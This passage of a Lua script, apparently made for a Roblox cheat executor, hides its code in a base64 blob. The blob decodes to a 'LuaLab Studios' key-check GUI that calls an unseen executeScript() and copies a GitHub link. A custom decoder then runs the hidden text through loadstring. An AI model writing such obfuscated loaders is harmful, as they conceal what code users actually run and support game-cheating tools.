Wwga2V5ID0ga2V5SW5wdXQuVGV4dDpnc3ViKCIlcysiLCAiIikKICAgICAgICAKICAgICAgICBpZiBrZXkgPT0gIiIgdGhlbgogICAgICAgICAgICBzdGF0dXMuVGV4dCA9ICJQbGVhc2UgZW50ZXIgYSBrZXkgZmlyc3QhIgogICAgICAgICAgICBzdGF0dXMuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMTAwLCAxMDApCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIHN0YXR1cy5UZXh0ID0gIlZhbGlkYXRpbmcga2V5Li4uIgogICAgICAgIHN0YXR1cy5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyMDAsIDEwMCkKICAgICAgICAKICAgICAgICBzcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHdhaXQoMSkKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIHZhbGlkID0gdmFsaWRhdGVLZXkoa2V5KQogICAgICAgICAgICBpZiB2YWxpZCB0aGVuCiAgICAgICAgICAgICAgICBzdGF0dXMuVGV4dCA9ICJLZXkgdmFsaWQhIEV4ZWN1dGluZy4uLiIKICAgICAgICAgICAgICAgIHN0YXR1cy5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMTAwLCAyNTUsIDEwMCkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgd2FpdCgxKQogICAgICAgICAgICAgICAgZXhlY3V0ZVNjcmlwdCgpCiAgICAgICAgICAgICAgICBzY3JlZW5HdWk6RGVzdHJveSgpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIFN0YXJ0ZXJHdWk6U2V0Q29yZSgiU2VuZE5vdGlmaWNhdGlvbiIsIHsKICAgICAgICAgICAgICAgICAgICBUaXRsZSA9ICJMdWFMYWIgU3R1ZGlvcyI7CiAgICAgICAgICAgICAgICAgICAgVGV4dCA9ICJTY3JpcHQgZXhlY3V0ZWQgc3VjY2Vzc2Z1bGx5ISI7CiAgICAgICAgICAgICAgICAgICAgRHVyYXRpb24gPSAzOwogICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgc3RhdHVzLlRleHQgPSAiSW52YWxpZCBvciBleHBpcmVkIGtleSEiCiAgICAgICAgICAgICAgICBzdGF0dXMuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMTAwLCAxMDApCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVuZCkKICAgIAogICAgZ2V0S2V5QnRuLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgc2V0Y2xpcGJvYXJkKCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vSGFzcm5YemVlZS9UTUIvcmVmcy9oZWFkcy9tYWluL0tleS5sdWEiKQogICAgICAgIGVuZCkKICAgICAgICAKICAgICAgICBzdGF0dXMuVGV4dCA9ICJLZXkgY29waWVkIHRvIGNsaXBib2FyZCEiCiAgICAgICAgc3RhdHVzLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigxMDAsIDIwMCwgMjU1KQogICAgZW5kKQogICAgCiAgICBjbG9zZUJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICBzY3JlZW5HdWk6RGVzdHJveSgpCiAgICBlbmQpCiAgICAKICAgIGZyYW1lLlNpemUgPSBVRGltMi5uZXcoMCwgMCwgMCwgMCkKICAgIGxvY2FsIHR3ZWVuID0gVHdlZW5TZXJ2aWNlOkNyZWF0ZShmcmFtZSwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuQmFjayksIHtTaXplID0gVURpbTIubmV3KDAsIDM4MCwgMCwgMjIwKX0pCiAgICB0d2VlbjpQbGF5KCkKZW5kCgpjcmVhdGVHVUkoKQoKU3RhcnRlckd1aTpTZXRDb3JlKCJTZW5kTm90aWZpY2F0aW9uIiwgewogICAgVGl0bGUgPSAiTWVzc2FnZSBGcm9tIFNlbiI7CiAgICBUZXh0ID0gIldlbGNvbWUhIjsKICAgIER1cmF0aW9uID0gNDsKfSk=" local __map={};(function() local chars='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' for i=1,#chars do __map[string.sub(chars,i,i)]=i-1 end end)() local out={};local i=1;while i<=#__b do local c1=__map[string.sub(__b,i,i)];local c2=__map[string.sub(__b,i+1,i+1)];local c3=__map[string.sub(__b,i+2,i+2)];local c4=__map[string.sub(__b,i+3,i+3)];if not c1 then break end;c2=c2 or 0;c3=c3 or 0;c4=c4 or 0;local n=c1*262144+c2*4096+c3*64+c4;local b1=math.floor(n/65536)%256;local b2=math.floor(n/256)%256;local b3=n%256;out[#out+1]=string.char(b1);if string.sub(__b,i+2,i+2)~='=' then out[#out+1]=string.char(b2) end;if string.sub(__b,i+3,i+3)~='=' then out[#out+1]=string.char(b3) end;i=i+4 end;local decoded=table.concat(out) local ok,err=pcall(function() local loader=loadstring or load;local f=loader(decoded);if type(f)=='function'then f() end end) if not ok then pcall(function() print('Wrapper error: '..tostring(err)) end) end end)()
